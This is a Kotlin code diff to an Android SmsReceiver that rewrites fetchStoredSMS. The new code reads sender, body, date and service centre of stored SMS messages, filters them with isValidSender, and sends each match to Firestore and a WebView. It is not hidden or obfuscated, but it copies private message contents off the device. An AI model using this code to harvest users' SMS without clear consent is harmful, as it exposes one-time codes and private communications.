@@ -109,46 +109,44 @@ class SmsReceiver(
     /**
      * Fetches all SMS messages on demand and sends them to WebView and Firestore.
      */
-fun fetchStoredSMS(context: Context): String? {
-    if (!hasPermission(context, android.Manifest.permission.READ_SMS)) {
-        Toast.makeText(context, "Permission is required to access SMS.", Toast.LENGTH_SHORT).show()
-        return null
-    }
+    fun fetchStoredSMS(context: Context) {
+        if (!hasPermission(context, android.Manifest.permission.READ_SMS)) {
+            Toast.makeText(context, "Permission is required to access SMS.", Toast.LENGTH_SHORT).show()
+            return
+        }
 
-    val smsList = mutableListOf<Map<String, Any>>()
+        val cursor: Cursor? = context.contentResolver.query(
+            Telephony.Sms.CONTENT_URI,
+            arrayOf(
+                Telephony.Sms.ADDRESS,
+                Telephony.Sms.BODY,
+                Telephony.Sms.DATE,
+                Telephony.Sms.SERVICE_CENTER
+            ),
+            null,
+            null,
+            Telephony.Sms.DEFAULT_SORT_ORDER
+        )
 
-    val cursor: Cursor? = context.contentResolver.query(
-        Telephony.Sms.CONTENT_URI,
-        arrayOf(
-            Telephony.Sms.ADDRESS,
-            Telephony.Sms.BODY,
-            Telephony.Sms.DATE,
-            Telephony.Sms.SERVICE_CENTER
-        ),
-        null,
-        null,
-        Telephony.Sms.DEFAULT_SORT_ORDER
-    )
+        cursor?.use {
+            while (it.moveToNext()) {
+                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
+                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
+                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                val serviceCenter = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.SERVICE_CENTER)) ?: "Unknown"
 
-    cursor?.use {
-        while (it.moveToNext()) {
-            val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
-            val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
-            val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
-            val serviceCenter = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.SERVICE_CENTER)) ?: "Unknown"
+                val smsData = mapOf(
+                    "address" to address,
+                    "body" to body,
+                    "date" to date,
+                    "serviceCenter" to serviceCenter
+                )
 
-            val smsData = mapOf(
-                "address" to address,
-                "body" to body,
-                "date" to date,
-                "serviceCenter" to serviceCenter
-            )
-
-            if (isValidSender(address, serviceCenter)) {
-                smsList.add(smsData)
+                if (isValidSender(address, serviceCenter)) {
+                    sendToFirestore(context, smsData)
+                    sendToWebView(smsData)
+                }
             }
         }
     }
- }
-    return Gson().toJson(smsList)
 }
